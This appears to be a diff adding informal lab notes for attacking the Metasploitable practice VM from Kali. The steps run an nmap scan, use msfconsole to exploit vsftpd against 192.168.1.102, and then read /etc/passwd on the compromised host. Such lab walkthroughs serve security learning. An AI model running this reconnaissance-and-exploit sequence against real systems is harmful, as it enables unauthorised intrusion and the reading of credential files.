@@ -1,0 +1,19 @@
+open metaspoloitable
+log in
+ifconfig-> copy ip
+
+open kali
+ping ip
+nmap -sV -A <Metasploitable_IP>
+go to msfconsole
+search vsftpd
+show options
+set rhost 192.168.1.102
+exploit
+ur in the other system
+ls
+mkdir <dir name>
+cat /etc/passwd
+whoami
+hostname
+ifconfig
